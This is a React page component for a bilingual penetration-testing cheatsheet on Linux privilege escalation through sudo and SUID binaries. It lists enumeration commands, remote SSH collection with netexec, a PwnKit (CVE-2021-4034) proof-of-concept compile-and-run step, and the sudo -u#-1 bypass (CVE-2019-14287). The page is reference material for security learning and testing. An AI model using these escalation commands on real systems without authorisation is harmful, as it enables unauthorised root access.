"use client";

import { useLanguage } from "@/components/LanguageProvider";
import { CheatsheetCommandCard } from "@/components/CheatsheetCommandCard";

export default function LinuxSudoSuidPage() {
  const { lang } = useLanguage();
  const entries = [
    { cmd: "sudo -l", why: lang === "fr" ? "Identifier les commandes sudo exécutables sans mot de passe." : "Identify sudo commands executable without password." },
    { cmd: "find / -perm -4000 -type f 2>/dev/null", why: lang === "fr" ? "Lister les binaires SUID exploitables." : "List potentially exploitable SUID binaries." },
    { cmd: "nxc ssh $TARGET -u $USER -p $PASS -x 'sudo -l'", why: lang === "fr" ? "Collecte distante sudoers via SSH validé." : "Collect remote sudoers data through validated SSH access." },
    { cmd: "nxc ssh $TARGET -u $USER -p $PASS -x 'id && whoami && hostname'", why: lang === "fr" ? "Contexte identité avant tentative d'escalade." : "Identity context before escalation attempt." },
    { cmd: "pkexec --version # policykit-1 < 0.105-33 = vulnérable", why: lang === "fr" ? "PwnKit (CVE-2021-4034) : pkexec est SUID par défaut sur la quasi-totalité des distros, root direct sans mot de passe si la version est vulnérable." : "PwnKit (CVE-2021-4034): pkexec is SUID by default on almost every distro, direct root without a password if the version is vulnerable." },
    { cmd: "gcc pwnkit.c -o pwnkit_exploit && ./pwnkit_exploit  # PoC arthepsy", why: lang === "fr" ? "Exploitation PwnKit : dépose un binaire SUID (ex: /tmp/rootbash) exploitable ensuite avec -p." : "PwnKit exploitation: drops a SUID binary (e.g. /tmp/rootbash) usable afterwards with -p." },
    { cmd: "sudo -u#-1 /bin/bash", why: lang === "fr" ? "CVE-2019-14287 (sudo < 1.8.28) : une règle sudoers (ALL, !root) est contournable, l'UID -1 (ou 4294967295) est mal interprété et exécute en root malgré l'exclusion explicite." : "CVE-2019-14287 (sudo < 1.8.28): a sudoers rule (ALL, !root) can be bypassed, UID -1 (or 4294967295) is mishandled and runs as root despite the explicit exclusion." },
  ];

  return (
    <div className="mx-auto max-w-3xl px-6 py-10 lg:px-10">
      <header className="mb-8 border-b border-border pb-6">
        <p className="mb-2 text-[11px] font-mono uppercase tracking-widest text-primary">Privesc Linux</p>
        <h1 className="text-2xl font-semibold tracking-tight text-foreground sm:text-3xl">Sudo / SUID</h1>
      </header>
      <section className="space-y-4">
        {entries.map((item) => <CheatsheetCommandCard key={item.cmd} cmd={item.cmd} why={item.why} lang={lang} />)}
      </section>
    </div>
  );
}
